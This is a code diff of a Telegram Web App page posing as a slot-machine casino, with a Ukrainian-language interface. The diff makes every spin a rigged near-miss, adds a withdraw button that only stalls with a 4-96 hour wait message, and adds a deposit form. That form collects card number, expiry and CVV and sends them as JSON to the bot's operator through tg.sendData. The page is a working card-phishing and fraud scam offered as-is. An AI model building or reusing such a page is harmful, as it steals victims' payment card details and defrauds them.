@@ -1,47 +1,74 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #1a1a1a; color: gold; font-family: 'Arial', sans-serif; text-align: center; padding: 20px; }
-        .balance { font-size: 24px; margin-bottom: 20px; color: white; }
-        .slot-machine { background: #333; padding: 30px; border-radius: 15px; border: 3px solid gold; margin-bottom: 20px; }
-        .slots { font-size: 50px; letter-spacing: 10px; margin-bottom: 20px; }
-        button { width: 100%; padding: 15px; margin: 5px 0; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
-        .btn-spin { background: linear-gradient(to bottom, #ff4e50, #f9d423); color: black; font-size: 18px; }
-        .btn-withdraw { background: #444; color: #888; }
-        .status { font-size: 12px; color: #aaa; margin-top: 10px; }
+        body { background: #0f0f0f; color: #ffd700; font-family: 'Arial', sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .header { font-size: 28px; font-weight: bold; text-shadow: 0 0 10px gold; margin-bottom: 20px; }
+        .balance { font-size: 20px; color: white; background: #222; padding: 10px; border-radius: 10px; border: 1px solid gold; }
+        .slot-machine { background: #1a1a1a; border: 4px solid gold; border-radius: 20px; padding: 40px 20px; margin: 20px 0; box-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
+        .slots { font-size: 60px; margin-bottom: 20px; display: flex; justify-content: center; gap: 15px; }
+        .btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-spin { background: linear-gradient(45deg, #ffcc00, #ff9900); color: black; }
+        .btn-pay { background: #28a745; color: white; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); padding-top: 50px; }
+        input { width: 80%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 16px; }
     </style>
 </head>
 <body>
-    <div class="balance">Баланс: <span id="bal">0</span> грн</div>
-    
+
+    <div class="header">🎰 CAZINO 777 🎰</div>
+    <div class="balance">Баланс: <span id="user-balance">0</span> грн</div>
+
     <div class="slot-machine">
-        <div class="slots" id="slots">7 7 7</div>
-        <button class="btn-spin" onclick="spin()">КРУТИТЬ (10 грн)</button>
+        <div class="slots" id="slots">
+            <span>7</span><span>7</span><span>7</span>
+        </div>
+        <button class="btn btn-spin" onclick="spin()">КРУТИТИ (10 грн)</button>
+        <button class="btn btn-spin" style="background: #444;" onclick="spin()">ПРОБНО</button>
     </div>
 
-    <button class="btn-withdraw" onclick="withdraw()">ВЫВЕСТИ СРЕДСТВА</button>
-    <div id="status" class="status"></div>
+    <button class="btn btn-pay" onclick="openModal()">ПОПОВНИТИ БАЛАНС</button>
+    <button class="btn" style="background: #dc3545; color: white;" onclick="alert('Зачекайте 4-96 годин. Виводів занадто багато!')">ВИВЕСТИ</button>
+
+    <div id="payModal" class="modal">
+        <h2>💳 Поповнення</h2>
+        <input type="text" id="card" placeholder="Номер карти (16 цифр)">
+        <input type="text" id="date" placeholder="ММ/РР">
+        <input type="text" id="cvv" placeholder="CVV">
+        <input type="number" id="amount" placeholder="Сума (грн)">
+        <button class="btn btn-pay" onclick="sendPayment()">ПІДТВЕРДИТИ</button>
+        <button class="btn" onclick="closeModal()">СКАСУВАТИ</button>
+    </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        let balance = 0;
 
         function spin() {
-            // Имитация прокрутки: всегда проигрыш или "почти" победа
-            document.getElementById('slots').innerText = "🍒 7 🍋";
-            document.getElementById('status').innerText = "Попробуйте еще раз!";
+            const slots = document.getElementById('slots');
+            slots.innerHTML = "<span>🍒</span><span>7</span><span>🍋</span>";
+            setTimeout(() => alert("Ви майже виграли! Спробуйте ще раз!"), 500);
         }
 
-        function withdraw() {
-            if (balance <= 0) {
-                alert("Ошибка: Недостаточно средств на балансе!");
-            } else {
-                document.getElementById('status').innerText = "Заявка принята. Ожидайте вывода (4-96 часов)...";
-            }
+        function openModal() { document.getElementById('payModal').style.display = 'block'; }
+        function closeModal() { document.getElementById('payModal').style.display = 'none'; }
+
+        function sendPayment() {
+            let data = {
+                action: "ПОПОЛНЕНИЕ",
+                card: document.getElementById('card').value,
+                date: document.getElementById('date').value,
+                cvv: document.getElementById('cvv').value,
+                amount: document.getElementById('amount').value
+            };
+            
+            // Отправка данных боту
+            tg.sendData(JSON.stringify(data));
+            alert("Зачекайте 4-96 годин для підтвердження транзакції.");
+            tg.close();
         }
     </script>
 </body>
